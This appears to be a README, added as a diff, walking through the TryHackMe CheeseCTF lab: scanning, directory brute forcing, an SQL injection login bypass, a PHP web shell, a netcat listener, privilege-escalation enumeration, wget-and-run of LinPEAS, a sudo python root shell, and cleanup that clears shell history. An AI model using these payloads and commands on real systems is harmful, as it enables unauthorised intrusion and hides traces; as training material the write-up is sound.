@@ -1,0 +1,99 @@
+# Project Overview
+
+A complete Capture The Flag (CTF) walkthrough demonstrating real-world penetration testing methodology including reconnaissance, enumeration, exploitation, privilege escalation, and flag capture on a vulnerable Linux machine.
+
+This project highlights hands-on cybersecurity skills aligned with SOC Analyst / Penetration Tester roles.
+
+# Author Information
+
+Name: Sumit Singh
+
+Platform: TryHackMe
+
+CTF Name: CheeseCTF
+
+Date: 31 July 2025
+
+Target IP: 10.10.140.14
+
+# Tools & Technologies Used
+
+Nmap – Network scanning & service enumeration
+
+Gobuster – Directory brute forcing
+
+Netcat – Reverse shell handling
+
+Linux Privilege Escalation – Manual + automated techniques
+
+LinPEAS – Privilege escalation enumeration
+
+OpenVPN – Secure lab access
+
+# Attack Methodology
+1️⃣ VPN Connection
+sudo openvpn TheRobottics.ovpn
+
+# Reconnaissance (Nmap Scan)
+sudo nmap -sS -sV -T4 -Pn 10.10.140.14
+
+Open Ports Identified:
+
+Port	Service	Version
+22	SSH	OpenSSH 7.9p1
+80	HTTP	Apache 2.4.29
+
+# Web Enumeration
+gobuster dir -u http://10.10.140.14 -w /usr/share/wordlists/dirb/common.txt
+
+Discovered Paths:
+
+/admin (403)
+
+/user.html (200)
+
+/messages.html (200)
+
+/robots.txt
+
+# Exploitation
+🔹 SQL Injection (Login Bypass)
+' OR 1=1 --
+🔹 Reverse Shell Upload
+<?php system($_GET['cmd']); ?>
+
+Listener Setup:
+
+nc -lvnp 4444
+
+Initial Access:
+
+whoami
+www-data
+
+
+# Privilege Escalation
+Enumeration Commands
+sudo -l
+uname -a
+find / -perm -4000 2>/dev/null
+ps aux
+cat /etc/crontab
+🚀 LinPEAS
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+🔑 Root Access (Example)
+sudo python3 -c 'import os; os.system("/bin/bash")'
+
+
+# Flag Capture
+🏁 User Flag
+cat /home/<username>/user.txt
+🏴 Root Flag
+cat /root/root.txt
+🧹 Cleanup
+rm linpeas.sh
+rm revshell.php
+history -c
+sudo killall openvpn
